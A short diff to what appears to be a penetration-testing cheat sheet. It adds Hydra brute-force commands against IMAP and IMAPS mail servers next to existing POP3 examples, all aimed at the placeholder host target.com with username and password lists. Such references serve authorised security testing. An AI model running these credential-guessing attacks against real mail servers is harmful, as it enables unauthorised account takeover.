@@ -48,3 +48,10 @@ hydra -l user@target.com -P passwords.txt pop3://target.com
 hydra -l user@target.com -P passwords.txt pop3s://target.com:995
 hydra -L users.txt -P passwords.txt pop3://target.com
 ```
+
+#### IMAP
+```
+hydra -l user@target.com -P passwords.txt imap://target.com
+hydra -l user@target.com -P passwords.txt imaps://target.com:993
+hydra -L users.txt -P passwords.txt imap://target.com
+```
